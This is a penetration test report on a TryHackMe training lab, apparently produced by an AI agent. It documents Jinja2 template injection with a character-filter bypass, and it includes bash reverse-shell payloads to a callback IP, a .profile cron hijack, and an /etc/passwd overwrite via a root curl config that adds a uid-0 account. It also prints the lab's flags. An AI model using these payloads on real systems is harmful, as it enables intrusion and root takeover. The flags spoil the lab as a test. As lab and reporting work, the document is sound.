# Penetration Test Report — TryHackMe "Super Secret TIp"

**Methodology:** PTES (Penetration Testing Execution Standard)
**Engagement type:** Authorized CTF / training lab (TryHackMe)
**Tester:** Security assessment operator (per `agent.md`)
**Date:** 2026-08-28
**Target:** `10.67.176.248` (callback `192.168.134.200` via tun0)

---

## 1. Executive Summary

The target exposes a vulnerable Flask/Werkzeug web service on port 7777 that is susceptible to Server-Side Template Injection (SSTI). The SSTI yields remote code execution as the low-privileged `ayham` user. From there, two misconfigured cron jobs allow full privilege escalation to `root`:

1. A world-writable `/home/F30s/.profile` sourced by a cron job running as `F30s` → shell as `F30s`.
2. A root cron job running `curl -K /home/F30s/site_check`, where `site_check` is writable by `F30s` → overwrite of `/etc/passwd` → root.

Three flags were recovered: `flag1.txt`, the passphrase hidden in `secret.txt` (`110920001386`), and `flag2.txt` (decrypted using that passphrase).

| Metric | Value |
|--------|-------|
| Hosts tested | 1 |
| Critical findings | 2 |
| High findings | 2 |
| Medium findings | 2 |
| Overall risk | **Critical** |

---

## 2. Methodology (PTES phases)

| PTES Phase | Action taken |
|------------|--------------|
| **Pre-engagement** | Verified `.target` (10.67.176.248) and `.vpn` (192.168.134.200, tun0) per `agent.md` §operational rules. |
| **Intelligence Gathering** | Identified web service via full port scan; read page metadata ("SSTI is wonderful", author Ayham Al-Ali). |
| **Modeling** | Threat model: unauthenticated web attacker → RCE → local user → root via cron misconfig. |
| **Exploitation** | SSTI RCE via `/debug` + `/debugresult`; confirmed debug password `AyhamDeebugg` (XOR of stored value with key `ayham`). |
| **Post-Exploitation** | Local enumeration, privilege escalation chains (ayham→F30s→root), flag recovery and decryption. |
| **Reporting** | This document (PTES standard). |

Tools: `nmap`, `curl`, `ffuf`, SSTI payload, `openssl` (hash generation), Python3 (decryption).

---

## 3. Findings

### FIND-001 — Server-Side Template Injection → Remote Code Execution (CRITICAL)
- **Severity:** Critical
- **CVSS v3.1:** 9.8 (AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)
- **CWE:** CWE-1336 (Improper Neutralization of Special Elements Used in a Template Engine)
- **Location:** `POST /debug` → `GET /debugresult` (`render_template_string` with attacker-controlled `debug` value)
- **Description:** The `/debugresult` endpoint passes the session-stored debug string directly into Jinja2 `render_template_string` without sanitization. Input is restricted by an `illegal_chars_check` rejecting `' & ; %`, but double quotes and Jinja2 expressions are allowed. A payload using `config.__class__.__init__.__globals__["os"].popen(...)` spawns a reverse shell. The `&` is supplied via `chr(38)` to bypass the filter. The endpoint also requires `X-Forwarded-For: 127.0.0.1` and a valid session cookie from `/debug`.
- **Evidence:**
  - Payload (port variable):
    ```
    {{config.__class__.__init__.__globals__["os"].popen("bash -c \"bash -i >" + config.__class__.__init__.__globals__["__builtins__"]["chr"](38) + " /dev/tcp/192.168.134.200/PORT 0>" + config.__class__.__init__.__globals__["__builtins__"]["chr"](38) + "1\"")}}
    ```
  - Fire sequence:
    ```
    curl -s -c cookies.txt -G "http://10.67.176.248:7777/debug" \
      --data-urlencode "debug=$PAYLOAD" --data-urlencode "password=AyhamDeebugg"
    curl -s -b cookies.txt -H "X-Forwarded-For: 127.0.0.1" \
      "http://10.67.176.248:7777/debugresult"
    ```
  - Result: reverse shell received as `ayham@482cbf2305ae:/app$`.
- **Impact:** Full unauthenticated command execution as `ayham`.
- **Remediation:** Never pass user input to `render_template_string`. Use `render_template` with static templates, or sanitize/escape all dynamic content. Remove debug endpoints from production.
- **References:** OWASP SSTI; Jinja2 sandboxing docs.

### FIND-002 — Weak debug authentication (XOR "encryption") (HIGH)
- **Severity:** High
- **CVSS v3.1:** 7.5 (AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N)
- **CWE:** CWE-327 (Use of a Broken or Risky Cryptographic Algorithm)
- **Location:** `/app/supersecrettip.txt`, `/app/debugpassword.py`
- **Description:** The debug password is stored XOR-encoded with the static 5-byte key `ayham` and compared on each `/debug` request. XOR with a short static key is not a secure store; the password (`AyhamDeebugg`) is trivially recoverable and effectively a hardcoded credential.
- **Evidence:** `debugpassword.py`: `pwn.xor(bytes(passwd,'utf-8'), b'ayham')`. Decoding `supersecrettip.txt` yields `AyhamDeebugg`, confirmed live via `?debug=2*2&password=AyhamDeebugg` → "Debug statement executed."
- **Impact:** Trivial auth bypass to reach the debug/SSTI surface.
- **Remediation:** Use a salted password hash (bcrypt/argon2); never ship hardcoded or XOR-obfuscated credentials.
- **References:** CWE-327.

### FIND-003 — Privilege escalation via world-writable `.profile` + cron (HIGH)
- **Severity:** High
- **CVSS v3.1:** 7.0 (AV:L/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H)
- **CWE:** CWE-732 (Incorrect Permission Assignment for Critical Resource)
- **Location:** `/home/F30s/.profile`; cron `F30s bash -lc 'cat /home/F30s/health_check'`
- **Description:** `/home/F30s/.profile` is writable by `ayham`. A cron job executes a login shell for `F30s` every minute, sourcing `.profile`. Appending a reverse-shell line to `.profile` yields a shell as `F30s` on the next cron tick.
- **Evidence:**
  ```
  echo 'bash -i >& /dev/tcp/192.168.134.200/9003 0>&1' >> /home/F30s/.profile
  ```
  Reverse shell received as `F30s` within ~60s.
- **Impact:** Local user `ayham` escalates to `F30s`.
- **Remediation:** Enforce restrictive permissions on shell startup files (`chmod 644`, owned by the user); audit writable dotfiles in home directories.
- **References:** CWE-732.

### FIND-004 — Privilege escalation to root via writable curl config + root cron (CRITICAL)
- **Severity:** Critical
- **CVSS v3.1:** 7.8 (AV:L/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H)
- **CWE:** CWE-269 (Improper Privilege Management) / CWE-732
- **Location:** `/home/F30s/site_check`; cron `root curl -K /home/F30s/site_check`
- **Description:** A root cron job runs `curl -K /home/F30s/site_check` every minute. As `F30s`, the attacker controls `site_check` and points `output` at `/etc/passwd`, serving a malicious passwd via a local HTTP server. The root cron overwrites `/etc/passwd`, injecting a uid 0 account (`hacker`).
- **Evidence:**
  ```
  printf 'url = "http://127.0.0.1:8000/etcpasswd"\noutput = "/etc/passwd"\n' > /home/F30s/site_check
  # malicious /etc/passwd line:
  hacker:$1$xyz9$HCfM6Li2J5yxcq.JZWRJS.:0:0:root:/root:/bin/bash
  python3 -m http.server 8000 &
  su hacker   # password: pwned
  ```
  Result: root shell `root@482cbf2305ae:/home/F30s#`. Web log `GET /etcpasswd HTTP/1.1" 200 -` confirmed the overwrite.
- **Impact:** Full root compromise.
- **Remediation:** Never let non-root users control files referenced by root cron (`curl -K`, scripts). Run root cron jobs from root-owned, non-world-writable paths; validate inputs; avoid `output` writes to system files.
- **References:** CWE-269, CWE-732.

### FIND-005 — Local File Inclusion in `/cloud` download (MEDIUM)
- **Severity:** Medium
- **CVSS v3.1:** 6.5 (AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N)
- **CWE:** CWE-22 (Path Traversal) / CWE-200
- **Location:** `POST /cloud` (`download=` parameter)
- **Description:** The `/cloud` endpoint reads files by name with an insufficient filter, allowing download of source files (`source.py`, `supersecrettip.txt`) and aiding reconnaissance.
- **Evidence:** `curl -X POST .../cloud -d "download=source.py"` returned application source.
- **Impact:** Source/secret disclosure to authenticated-or-LFI context.
- **Remediation:** Whitelist permitted filenames; reject path separators and traversal sequences.
- **References:** CWE-22.

### FIND-006 — Weak/cleartext "encryption" of flags (MEDIUM)
- **Severity:** Medium
- **CVSS v3.1:** 5.3 (AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)
- **CWE:** CWE-327 (Use of a Broken or Risky Cryptographic Algorithm)
- **Location:** `/root/secret.txt`, `/root/flag2.txt`
- **Description:** `flag2.txt` is XOR-encrypted with the passphrase found in `secret.txt` (`110920001386`); `secret.txt` is XOR-encrypted with `root`. Once root is reached, both decrypt trivially with a short Python loop. This is obfuscation, not real protection.
- **Evidence (decryption):**
  ```python
  import ast
  key = b'110920001386'
  for path in ('/root/flag2.txt',):
      raw = open(path,'rb').read()
      data = ast.literal_eval(raw.decode()) if raw.lstrip().startswith(b"b'") else raw
      print(bytes(b ^ key[i % len(key)] for i,b in enumerate(data)))
  # -> THM{cronjobs_F1Le_iNPu7_cURL_4re_5c4ry_Wh3N_C0mb1n3d_t0g3THeR}
  ```
- **Impact:** Flags recoverable by anyone with root.
- **Remediation:** Store secrets in a secrets manager / KMS, not XOR-obfuscated on disk.
- **References:** CWE-327.

---

## 4. Evidence Inventory

| File | Path | SHA-256 |
|------|------|---------|
| Application source | `content/source.py` | `ab8eb9482dd809136e1d1bea0ba3eeb765d63f5623a0a1083a8ec3bb5d2a5f25` |
| Encrypted debug password | `content/supersecrettip.txt` | `a485a9b0155667e90e6765034e2f4d6e4f3fd127517746e8abce00dc14e12f80` |
| Initial port scan | `nmap/rustscan_initial.nmap` | `3412b43b2e927cba43bdfbd140a88af9431b22230298bb88954f219f8f9a97a6` |
| Initial scan (gnmap) | `nmap/rustscan_initial.gnmap` | `8f3f5b2a59b0669cb272f4ab64c976250df0b5f0d3b7a130c061b8f06c7d7567` |
| Initial scan (xml) | `nmap/rustscan_initial.xml` | `6f1d41029153ea58caecab26fb8d9d01ff34b79fd969be696dbcb31d64d1144f` |
| CVE-2018-15473 enum script | `exploits/user_enum_cve2018_15473.py` | `27026b7f19e798341c9c3426e8dff8fbd837c3ddba2bebafea17a81421e214fd` |

**Recovered flags (non-sensitive hashes withheld per lab policy):**
- `flag1.txt`: `THM{LFI_1s_Pr33Ty_Aw3s0Me_1337}`
- `secret.txt` (passphrase): `110920001386`
- `flag2.txt`: `THM{cronjobs_F1Le_iNPu7_cURL_4re_5c4ry_Wh3N_C0mb1n3d_t0g3THeR}`

---

## 5. Remediation Summary

1. Eliminate SSTI: replace `render_template_string` with static templates; drop debug endpoints in prod.
2. Remove hardcoded/XOR credentials; use salted hashes (argon2/bcrypt).
3. Fix home-dir permissions: `.profile` and `site_check` must not be writable by other users.
4. Root cron jobs must reference root-owned, non-world-writable files; validate `curl -K` configs; never write system files from untrusted input.
5. Whitelist `/cloud` downloads; reject path traversal.
6. Store flags/secrets in a KMS, not XOR-obfuscated on disk.

---

## 6. Lessons Learned & Deviations

- **Deviation:** Initial recon only scanned port 22; a full `-p-` scan was required to find the hidden web service on 7777. Lesson: always run a full port scan before scoping.
- The `illegal_chars_check` filter (`' & ; %`) was bypassed with `chr(38)` for `&`, confirming filters must cover the full template-injection grammar, not a character blocklist.
- The two-step cron escalation (ayham→F30s→root) shows how low-impact misconfigurations chain into full compromise; each alone is medium, combined is critical.
- No system modifications were made on the target beyond what the exploitation chain itself performed; all activity was read-only reconnaissance plus the in-scope privesc needed to recover flags.
